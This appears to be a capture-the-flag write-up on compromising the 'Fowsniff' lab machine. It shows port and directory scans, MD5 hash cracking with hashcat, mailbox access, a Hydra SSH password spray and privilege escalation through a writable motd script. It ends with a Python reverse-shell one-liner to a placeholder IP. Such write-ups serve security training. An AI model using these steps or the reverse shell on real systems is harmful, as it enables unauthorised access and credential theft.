---

Start scanning the machine using **nmap** 
```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-06 15:12 CET
Nmap scan report for 10.10.250.22
Host is up (0.081s latency).
Not shown: 1020 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 903566f4c6d295121be8cddeaa4e0323 (RSA)
|   256 539d236734cf0ad55a9a1174bdfdde71 (ECDSA)
|_  256 a28fdbae9e3dc9e6a9ca03b1d71b6683 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER TOP CAPA UIDL PIPELINING AUTH-RESP-CODE RESP-CODES
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: more ENABLE LOGIN-REFERRALS listed OK capabilities SASL-IR LITERAL+ post-login ID Pre-login have AUTH=PLAINA0001 IMAP4rev1 IDLE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.54 seconds
```

We found 4 services running on this machine (ports: 22,80,110 and 143). We found a service **SSH** running on port 22, a web server running on port 80, a **POP3** server on 110 and **IMAP** on port 143.
We could now scan the web server directory using **gobuster** or **dirb** 

```
GENERATED WORDS: 4612                                                          

Scanning URL: http://10.10.250.22/
==> DIRECTORY: http://10.10.250.22/assets/       
==> DIRECTORY: http://10.10.250.22/images/    
+ http://10.10.250.22/index.html (CODE:200|SIZE:2629) 
+ http://10.10.250.22/robots.txt (CODE:200|SIZE:26)                            
+ http://10.10.250.22/server-status (CODE:403|SIZE:300)                                                           
Entering directory: http://10.10.250.22/assets/
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway) 
Entering directory: http://10.10.250.22/images/ 
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

END_TIME: Sat Jan  6 15:29:32 2024
DOWNLOADED: 4612 - FOUND: 3
```
The website talk about a official Twitter account where an attacker could dump some sensitive information. We found on this a Pastebin link in a tweet but information were deleted. We can see another link were we could get more information. We get a backup link where we could find the information dump by the hacker.
We have now get some mail address and hash password form employees. We can now try to decode them. 

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

Using **haiti** we learned these password were encrypted with **MD5** algorith. We can now use **Hashcat** or **John The Ripper** to decode these passwords.

```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 5 5600 6-Core Processor, 2917/5898 MB (1024 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 7 digests; 7 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

90dc16d47114aa13671c697fd506cf26:scoobydoo2               
4d6e42f56e127803285a0a7649b5ab11:orlando12                
1dc352435fecca338acfd4be10984009:apples01                 
19f5af754c31f1e2651edde9250d69bb:skyler22                 
f7fd98d380735e859f8b2ffbbede5a7e:07011972                 
0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever                
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: passwords
Time.Started.....: Sat Jan  6 16:02:31 2024 (4 secs)
Time.Estimated...: Sat Jan  6 16:02:35 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3142.7 kH/s (0.09ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 6/7 (85.71%) Digests (total), 6/7 (85.71%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util:100%

Started: Sat Jan  6 16:02:15 2024
Stopped: Sat Jan  6 16:02:37 2024
```

So with using **Hashcat**, we have get six passwords

```
90dc16d47114aa13671c697fd506cf26:scoobydoo2  => seina@fowsniff            
4d6e42f56e127803285a0a7649b5ab11:orlando12   => parede@fowsniff        
1dc352435fecca338acfd4be10984009:apples01    => tegel@fowsniff          
19f5af754c31f1e2651edde9250d69bb:skyler22    => baksteen@fowsniff        
f7fd98d380735e859f8b2ffbbede5a7e:07011972    => sciana@fowsniff           
0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever   => mursten@fowsniff
```
We could now try do log in on employees mail account.
```
$ telnet 10.10.250.22 110
```

Through Seina's emails, we can read a mail from Stone and we can get a **SSH** temporary password : `S1ck3nBluff+secureshell`.

We can try to use **Hydra** to see if an employee did not change his password.
```
$ hydra -L employees_list.txt -p S1ck3nBluff+secureshell 10.10.250.22 ssh
```
Baksteen did not have change his **SSH** credentials so we have now an access to machine by **SSH**

We can use a script to try to find an exploit. We will use the LinPEAS script.

```
$ ./LinPEAS.sh -o interesting_perms_files,interesting_files,procs_crons_timers_srvcs_sockets
```
We see a file that can be edited by the group which belongs to Parede. If we check in update-motd.d directory, we can see a file running as root when a user connects to the machine using SSH which use the file we edited. We can now stop the **SSh** connection and restart it to get a root reverse shell. 

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local-IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
We are now connect as root on the machine !
